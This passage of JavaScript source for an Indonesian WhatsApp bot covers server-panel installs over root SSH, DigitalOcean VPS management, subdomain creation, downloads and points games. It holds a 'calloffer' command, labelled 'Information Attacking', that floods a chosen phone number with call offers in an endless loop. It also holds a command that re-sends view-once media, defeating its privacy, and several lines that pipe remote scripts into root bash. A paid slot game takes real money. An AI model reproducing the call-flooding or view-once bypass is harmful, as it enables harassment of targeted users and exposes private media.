var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break


case 'startwings':{
if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case 'installtemaenigma': {
if (!isCreator) return m.reply('Khusus developer')
if (!text || !text.split("|")) return m.reply("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return m.reply("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
 
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => { 
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`);
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6289502445574\n');
stream.write('https://whatsapp.com/channel/0029VamaPTHIXnlrKntgXA3N\n');
stream.write('https://whatsapp.com/channel/0029VamaPTHIXnlrKntgXA3N\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case 'uninstalltema': {
if (!isCreator) return m.reply('Khusus developer')
if (!text || !text.split("|")) return m.reply("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return m.reply("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
 
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => { 
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`)
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case 'installtemanight': {
if (!isCreator) return m.reply('Khusus developer')
if (!text || !text.split("|")) return m.reply("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return m.reply("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
 
const command = `bash <(curl -s https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema nightcore* pterodactyl\nTunggu 1-10 menit hingga proses selesai, dan saya akan menghubungi anda kembali jika sudah selesai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => { 
await m.reply("Berhasil install *tema nightcore* pterodactyl ✅\nSilahkan cek di panel anda untuk melihat perubahan")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`1\n`) 
stream.write(`y\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case 'subdomain': {
const obj = Object.keys(global.subdomain)
let count = 0
let teks = `
 *#- List all domain server*\n`
for (let i of obj) {
count++
teks += `\n* ${count}. ${i}\n`
}
teks += `\n Contoh : *.domain 2 host|ipvps*\n`
m.reply(teks)

}
break

case 'domain': {
if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break

case 'rvo': {
if (!m.quoted) return m.reply("dengan reply pesannya")
let msg = m.quoted.message
 let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
 let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
 let buffer = Buffer.from([])
 for await (const chunk of media) {
 buffer = Buffer.concat([buffer, chunk])
 }
 if (/video/.test(type)) {
 return cupen.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
 } else if (/image/.test(type)) {
 return cupen.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
 } else if (/audio/.test(type)) {
 return cupen.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
 } 
}
break

case 'buyvps':
{
 let audioFile = './audio.mp3';
await cupen.sendMessage(m.chat, { react: { text: '♨️', key: m.key } })
 const msgii = await generateWAMessageFromContent(m.chat, {
 viewOnceMessageV2Extension: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 }, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: "*_Dɪɢɪᴛᴀʟ Oᴄᴇᴀɴ_*"
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: [{
 body: proto.Message.InteractiveMessage.Body.fromObject({
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `*_Sɪʟᴀʜᴋᴀɴ Pɪʟɪʜ Rᴀᴍ Vᴘs Dɪ Bᴀᴡᴀʜ_*
`,
 hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/5l4xi5.jpg' }}, { upload: cupen.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
 {
"name": "single_select",
"buttonParamsJson": `{ "title": "Rᴀᴍ Vᴘs", "sections": [{ "title": "# ꜱɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ", "highlight_label": \"Pᴏᴡᴇʀᴇᴅ Bʏ ❀SalwaCantik❀\", "rows": [{ "header": "1GʙC1", "title": "くそ 15.000", "id": ".ram1gb" }, 
{ "header": "2GʙC2", "title": "くそ 25.000", "id": ".ram2gb" }, 
{ "header": "4GʙC2", "title": "くそ 35.000", "id": ".ram4gb" }, 
{ "header": "8GʙC4", "title": "くそ 45.000", "id": ".ram8gb" }, 
{ "header": "16GʙC4", "title": "くそ 65.000", "id": ".ram16gb"}]}]}`
}, 

 {
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"Chanell Developer\",\"url\":\"https://whatsapp.com/channel/0029VajU7yJJZg47Mgw99L0W\",\"merchant_url\":\"https://t.me/botobf\"}`
 }]
 })
 }
 ]
 })
 })
 }
 }
 }, { userJid: m.sender, quoted: qtoko })
 await cupen.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
 await cupen.sendMessage(m.chat, {
 audio: { url: audioFile },
 mimetype: 'audio/mpeg'
 }, { quoted: fkontak })
 }
 break
case 'changeapi':
{
 { if (!isCreator) return m.reply('Khusus developer');
 }

 if (!text || text.trim() === '') {
 return cupen.sendMessage(m.chat, {
 text: '❌ Anda harus memberikan API key baru.\nGunakan format: .changeapi [API_KEY_BARU]',
 });
 }

 const newApiKey = text.trim();

 try {
 // Validasi API key baru
 const validationResponse = await fetch('https://api.digitalocean.com/v2/account', {
 method: 'GET',
 headers: {
 'Content-Type': 'application/json',
 Authorization: `Bearer ${newApiKey}`,
 },
 });

 if (!validationResponse.ok) {
 throw new Error('API key tidak valid atau server DigitalOcean tidak dapat diakses.');
 }

 const accountData = await validationResponse.json();

 // Baca file config.js
 const fs = require('fs');
 const configFilePath = './config.js';
 let configContent = fs.readFileSync(configFilePath, 'utf-8');

 // Ganti API key di file config.js
 const updatedConfig = configContent.replace(
 /global\.digitalocean_apikey\s*=\s*".*?"/,
 `global.digitalocean_apikey = "${newApiKey}"`
 );

 // Tulis kembali file config.js
 fs.writeFileSync(configFilePath, updatedConfig, 'utf-8');

 // Reload file config.js
 delete require.cache[require.resolve(configFilePath)];
 require(configFilePath);

 // Kirim pesan berhasil
 return cupen.sendMessage(m.chat, {
 text: `✅ API key berhasil diperbarui.\n\nAkun yang digunakan:\n- Nama: ${accountData.account.name}\n- Email: ${accountData.account.email}\n- Status: ${accountData.account.status}\n\nSemua transaksi berikutnya akan menggunakan API key baru ini.`,
 });
 } catch (error) {
 console.error('Error mengganti API key:', error);
 return cupen.sendMessage(m.chat, {
 text: '❌ Gagal memperbarui API key. Pastikan API key valid dan server DigitalOcean dapat diakses.',
 });
 }
}
break
case 'deletedroplet':
{
 { if (!isCreator) return m.reply('Khusus developer');
 }

 if (!text || isNaN(text)) {
 return cupen.sendMessage(m.chat, {
 text: '❌ Anda harus memberikan ID droplet yang valid.\nGunakan format: .deletedroplet [ID_DROPLET]',
 });
 }

 const dropletId = text.trim();

 try {
 const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
 method: 'DELETE',
 headers: {
 'Content-Type': 'application/json',
 Authorization: `Bearer ${global.digitalocean_apikey}`,
 },
 });

 if (response.status !== 204) {
 throw new Error('Gagal menghapus droplet. Periksa ID droplet Anda.');
 }

 const confirmationMessage = `✅ *DROPLET BERHASIL DIHAPUS*\n\n- *ID Droplet:* ${dropletId}\n\nDroplet telah dihapus dari akun DigitalOcean Anda.`;

 return cupen.sendMessage(m.chat, {
 image: { url: 'https://i.postimg.cc/BQ9pHFFc/WysModz.jpg' },
 caption: confirmationMessage,
 });
 } catch (error) {
 console.error('Error saat menghapus droplet:', error);
 return cupen.sendMessage(m.chat, {
 text: '❌ Gagal menghapus droplet. Pastikan ID droplet benar dan API key valid.',
 });
 }
}
break
case 'listdroplet': {
if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.digitalocean_apikey
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
m.reply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n`;
});
}
cupen.sendMessage(m.chat, { text: mesej }, {quoted: m});
});
} catch (err) {
m.reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break
case 'play-v2': {
 if (!text) return m.reply('Example: Masih hatiku');
 m.reply('_Waittt Sedang Kami Proses..._')
 try {
let search = require("yt-search");
let { youtube } = require("btch-downloader");
 const look = await search(text);
 const convert = look.videos[0];
 if (!convert) return reply('Video/Audio Tidak Ditemukan');
 if (convert.seconds >= 3600) {
 return reply(m.chat, 'Video is longer than 1 hour!');
 } else {
 let audioUrl;
 try {
 audioUrl = await youtube(convert.url);
 } catch (e) {
 reply(mess.wait)
 audioUrl = await youtube(convert.url);
 }

 await cupen.sendMessage(m.chat, {
 audio: {
 url: audioUrl.mp3
 },
 mimetype: 'audio/mpeg',
 contextInfo: {
 externalAdReply: {
 title: convert.title,
 body: "",
 thumbnailUrl: convert.image,
 sourceUrl: audioUrl.mp3,
 mediaType: 1,
 showAdAttribution: true,
 renderLargerThumbnail: true
 }
 }
 }, {
 quoted: m
 });
 }
 } catch (e) {
 reply(m.chat, `*Error:* ` + e.message);
 }
};
break

case 'mediafire2':{
if (!text) return m.reply(`Contoh: ${prefix+command} linknya ${pushname} ?`)

 let donlot = await mediafire(text);
 let result = donlot.data;

 const fileType = result.mimetype || await getFileTypeFromUrl(result.link);
 const fileName = result.filename || path.basename(result.link);

 if (fileType === "application/zip" || fileType === "application/pdf" || fileType === "application/vnd.ms-excel") {
 cupen.sendMessage(m.chat, { 
 document: { url: result.link },
 fileName: fileName,
 mimetype: fileType 
 },{quoted:m});
 } else if (fileType.startsWith("image/")) {
 cupen.sendMessage(m.chat, { 
 image: { url: result.link },
 caption: fileName 
 },{quoted:m});
 } else if (fileType.startsWith("audio/")) {
 cupen.sendMessage(m.chat, { 
 audio: { url: result.link },
 mimetype: fileType,
 ptt: true // Push-to-talk untuk audio
 },{quoted:m});
 } else if (fileType.startsWith("video/")) {
 cupen.sendMessage(m.chat, { 
 video: { url: result.link },
 caption: fileName 
 });
 } else {
 cupen.sendMessage(m.chat, { 
 document: { url: result.link },
 fileName: fileName,
 mimetype: fileType 
 },{quoted:m});
 }
 }
 break

case 'r1c1': case 'r2c1': case 'r4c2': case 'r8c4': case 'r16c4': {
if (!text) return m.reply(`Example : *.${command}* hostname`)
 await sleep(1000)
 let images
 let region = "sgp1"
 if (command == "r1c1") {
 images = "s-1vcpu-1gb"
 } else if (command == "r2c1") {
 images = "s-1vcpu-2gb"
 } else if (command == "r4c2") {
 images = "s-2vcpu-4gb"
 } else if (command == "r8c4") {
 images = 's-4vcpu-8gb'
 } else {
 images = "s-4vcpu-16gb-amd"
 region = "syd1"
 }
 let hostname = text.toLowerCase()
 if (!hostname) return m.reply(`Example : *.${command}* hostname`)
 function generateRandomPassword() {
 const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
 const length = 10;
 let password = '';
 for (let i = 0; i < length; i++) {
 const randomIndex = Math.floor(Math.random() * characters.length);
 password += characters[randomIndex];
 }
 return password;
}

 try { 
 let dropletData = {
 name: hostname,
 region: region,
 size: images,
 image: 'ubuntu-20-04-x64',
 ssh_keys: null,
 backups: false,
 ipv6: true,
 user_data: null,
 private_networking: null,
 volumes: null,
 tags: ['T']
 };

 const password = await generateRandomPassword()
 dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

 let response = await fetch('https://api.digitalocean.com/v2/droplets', {
 method: 'POST',
 headers: {
 'Content-Type': 'application/json',
 'Authorization': "Bearer " +
global.digitalocean_apikey
 },
 body: JSON.stringify(dropletData)
 });

 let responseData = await response.json();

 if (response.ok) {
 let dropletConfig = responseData.droplet;
 let dropletId = dropletConfig.id;

 // Menunggu hingga VPS selesai dibuat
 await m.reply(`Memproses pembuatan vps...\nSilahkan Tunggu 2-5 Menit !`);
 await new Promise(resolve => setTimeout(resolve, 60000));

 // Mengambil informasi lengkap tentang VPS
 let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
 method: 'GET',
 headers: {
 'Content-Type': 'application/json',
 'Authorization': "Bearer " + global.digitalocean_apikey
 }
 });

 let dropletData = await dropletResponse.json();
 let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
 ? dropletData.droplet.networks.v4[0].ip_address 
 : "Tidak ada alamat IP yang tersedia";

 let messageText = `Sukses Membuat VPS!\n\n`;
 messageText += `ID: ${dropletId}\n`;
 messageText += `IP VPS: ${ipVPS}\n`;
 messageText += `Password: ${password}`;

 await cupen.sendMessage(m.chat, { text: messageText });
 } else {
 throw new Error(`Gagal membuat VPS: ${responseData.message}`);
 }
 } catch (err) {
 console.error(err);
 m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
 }
}
break

case 'reinstall': {
 if (!isCreator) return m.reply('Khusus developer');
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(global.domain + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('Server tidak ditemukan')
m.reply('Mereinstall server...')
}
break

case 'restartsrv': {
if (!isCreator) return m.reply('Khusus developer');
let action = command.replace('srv', '')
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(global.domain + "/api/client/servers/" + srv + "/power", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apikey,
},
"body": JSON.stringify({
"signal": action
})
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
m.reply(`Sukses ${action.toUpperCase()} server`)
}
break

case 'suspend': {
 if (!isCreator) return m.reply('Khusus developer');
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(global.domain + "/api/application/servers/" + srv + "/suspend", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('Server tidak ditemukan')
m.reply('Sukses suspend server')
}
break



case 'sc': 
case 'script': {
let buy = `▧ 「 *${global.kiw}❀SalwaCantik❀${global.kiw}* 」
*_${global.kiw}Buy Script ? Wa.me/6289502445574${global.kiw}_*
`
cupen.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 40000000,
 requestFrom: m.sender,
 noteMessage: {
 extendedTextMessage: {
 text: buy,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})
await sleep(2500)
 CupenSc()
}
break

case 'calloffer': {
if (!isCreator) return cupen.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
if (!q) return m.reply("Example Use.\n calloffer 62xx / @tag")
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(`
⌜ *Information Attacking* ⌟
- Attack Status : _True_
- Command : _CallOffer_
- Target : _${target}_
`)
await sleep(1000)
while (true) {
await sendOfferCall(target)
}
}
break

case 'antispam': {
if (!args[0]) return m.reply(`Contoh: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.antispam = true
await m.reply('Sukses mengaktifkan antispam.')
} else if (args[0] === 'off') {
global.antispam = false
await m.reply('Sukses menonaktifkan antispam.')
}}
break

case 'slot':
{
 if (!text || isNaN(text)) return m.reply('Contoh: .slot 100\n(Tentukan jumlah taruhan dalam angka)');
 
 const bet = parseInt(text);
 const userBalance = getUserBalance(m.sender);

 if (bet <= 0) return m.reply('Taruhan harus lebih dari 0!');
 if (bet > userBalance) return m.reply('Saldo Anda tidak cukup untuk taruhan ini!');
 
 // Kurangi saldo pengguna
 updateUserBalance(m.sender, -bet);

 // Simbol slot
 const symbols = ['🍒', '🍋', '🍇', '🔔', '⭐', '💎'];
 const spin = () => symbols[Math.floor(Math.random() * symbols.length)];

 // Animasi slot
 let currentDisplay = '| ⏳ | ⏳ | ⏳ |'; // Awal animasi
 let slotMessage = await cupen.sendMessage(m.chat, { text: `🎰 *SLOT MACHINE* 🎰\n\n${currentDisplay}\n\n_Tunggu sebentar..._` });

 for (let i = 0; i < 5; i++) { // 5 putaran animasi
 await sleep(500); // Delay 500ms per putaran
 currentDisplay = `| ${spin()} | ${spin()} | ${spin()} |`;

 // Simulasi pengeditan pesan dengan mengganti kontennya
 await cupen.sendMessage(m.chat, {
 text: `🎰 *SLOT MACHINE* 🎰\n\n${currentDisplay}\n\n_Memutar..._`,
 edit: slotMessage.key, // Menggunakan ID pesan sebelumnya
 });
 }

 // Hasil akhir slot
 const finalResult = [spin(), spin(), spin()];

 // Perhitungan hadiah
 let reward = 0;
 if (finalResult[0] === finalResult[1] && finalResult[1] === finalResult[2]) {
 reward = bet * 5; // Hadiah jika semua simbol sama
 } else if (finalResult[0] === finalResult[1] || finalResult[1] === finalResult[2] || finalResult[0] === finalResult[2]) {
 reward = bet * 2; // Hadiah jika dua simbol sama
 }

 // Tambahkan hadiah ke saldo pengguna
 if (reward > 0) {
 updateUserBalance(m.sender, reward);
 }

 // Hasil akhir
 const finalDisplay = `| ${finalResult[0]} | ${finalResult[1]} | ${finalResult[2]} |`;
 const resultMessage = reward > 0 
 ? `Selamat! Anda memenangkan *${reward}* poin!\nSaldo Anda sekarang: *${getUserBalance(m.sender)}*`
 : `Sayang sekali, Anda kalah!\nSaldo Anda sekarang: *${getUserBalance(m.sender)}*`;

 await cupen.sendMessage(m.chat, {
 text: `🎰 *SLOT MACHINE* 🎰\n\n${finalDisplay}\n\n${resultMessage}`,
 edit: slotMessage.key, // Menggunakan ID pesan sebelumnya
 });
 break;
}
case 'addsaldo': {
 if (!isCreator) return m.reply('Perintah ini hanya bisa digunakan oleh admin/bot owner!');
 const [target, amount] = text.split(' ');
 if (!target || isNaN(amount)) return m.reply('Contoh: .addsaldo 6289502445574 1000\n(Tambahkan saldo ke nomor pengguna)');

 const user = target + '@s.whatsapp.net';
 const saldo = parseInt(amount);
 updateUserBalance(user, saldo);

 m.reply(`Berhasil menambahkan saldo *${saldo}* untuk pengguna *${target}*.\nSaldo sekarang: *${getUserBalance(user)}*`);
 break;
}

case 'ceksaldo': {
 const user = m.sender;
 const saldo = getUserBalance(user);

 m.reply(`Saldo Anda saat ini: *${saldo}* poin.`);
 break;
}

case 'leaderboard': {
 const leaderboard = getLeaderboard();
 if (leaderboard.length === 0) return m.reply('Belum ada data saldo pengguna.');

 let message = '🏆 *Leaderboard Top 10* 🏆\n\n';
 leaderboard.forEach(([user, saldo], index) => {
 const username = user.split('@')[0]; // Hanya tampilkan nomor
 message += `${index + 1}. *${username}* - *${saldo}* poin\n`;
 });

 m.reply(message);
 break;
}

case 'transfer': {
 const [target, amount] = text.split(' ');
 if (!target || isNaN(amount)) return m.reply('Contoh: .transfer 6289502445574 500\n(Transfer saldo ke nomor pengguna)');
 
 const sender = m.sender;
 const receiver = target + '@s.whatsapp.net';
 const transferAmount = parseInt(amount);

 if (transferAmount <= 0) return m.reply('Jumlah transfer harus lebih dari 0!');
 if (transferAmount > getUserBalance(sender)) return m.reply('Saldo Anda tidak cukup untuk transfer ini!');

 updateUserBalance(sender, -transferAmount);
 updateUserBalance(receiver, transferAmount);

 m.reply(`Berhasil mentransfer *${transferAmount}* poin ke *${target}*.\nSaldo Anda sekarang: *${getUserBalance(sender)}*`);
 break;
}

case 'slotpay':
{
 const harga = parseInt(text); // Nominal taruhan yang ditentukan oleh user
 if (!harga || isNaN(harga) || harga <= 0) return m.reply('❌ Masukkan jumlah taruhan yang valid!\nContoh: .slotpay 5000');

 try {
 // =======================
 // Buat QRIS
 // =======================
 const pay = await (await fetch(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${harga}&codeqr=${qrisorkut}`)).json();

 const expirationTime = new Date(pay.result.expirationTime);
 const timeLeft = Math.max(0, Math.floor((expirationTime - new Date()) / 60000));
 const currentTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
 const expireTimeJakarta = new Date(currentTime.getTime() + timeLeft * 60000);
 const hours = expireTimeJakarta.getHours().toString().padStart(2, '0');
 const minutes = expireTimeJakarta.getMinutes().toString().padStart(2, '0');
 const formattedTime = `${hours}:${minutes}`;

 const tek = `*🎰 SLOT BERBAYAR 🎰*\n\n*Taruhan*: Rp. ${harga}\n\nSilahkan scan QRIS di atas sebelum ${formattedTime} WIB untuk pembayaran.`;
 await cupen.sendMessage(m.chat, { image: { url: `${pay.result.qrImageUrl}` }, caption: `${tek}` }, { quoted: m });

 const apiUrl = `https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`;
 let isTransactionComplete = false;
 const maxWaitTime = 5 * 60 * 1000; // Waktu tunggu maksimal 5 menit
 const startTime = new Date().getTime();

 while (!isTransactionComplete && new Date().getTime() - startTime < maxWaitTime) {
 try {
 const response = await fetch(apiUrl);
 const result = await response.json();

 if (result && result.amount && parseInt(result.amount) === harga) {
 isTransactionComplete = true;

 // Notifikasi pembayaran selesai
 await cupen.sendMessage(m.chat, { text: `✅ Pembayaran berhasil! Memulai spin...` }, { quoted: m });

 // =======================
 // SLOT SPIN LOGIC
 // =======================
 const winBigChance = 10; // Peluang menang besar
 const winSmallChance = 30; // Peluang menang kecil
 const loseChance = 85 - (winBigChance + winSmallChance);
 const resultChance = Math.random() * 100;

 const symbols = ['🍒', '🍋', '🍇', '🔔', '⭐', '💎'];
 const spin = () => symbols[Math.floor(Math.random() * symbols.length)];

 let resultType;
 if (resultChance < winBigChance) {
 resultType = 'bigWin';
 } else if (resultChance < winBigChance + winSmallChance) {
 resultType = 'smallWin';
 } else {
 resultType = 'lose';
 }

 // Animasi slot
 let currentDisplay = '| ⏳ | ⏳ | ⏳ |';
 let slotMessage = await cupen.sendMessage(m.chat, { text: `🎰 *SLOT MACHINE* 🎰\n\n${currentDisplay}\n\n_Tunggu sebentar..._` });

 for (let i = 0; i < 4; i++) { // Maksimal 4 kali animasi
 await sleep(1000); // Delay lebih panjang untuk stabilitas
 currentDisplay = `| ${spin()} | ${spin()} | ${spin()} |`;
 try {
 slotMessage = await cupen.sendMessage(m.chat, { text: `🎰 *SLOT MACHINE* 🎰\n\n${currentDisplay}\n\n_Memutar..._`, edit: slotMessage.key });
 } catch (error) {
 console.error('Error saat mengedit pesan animasi:', error);
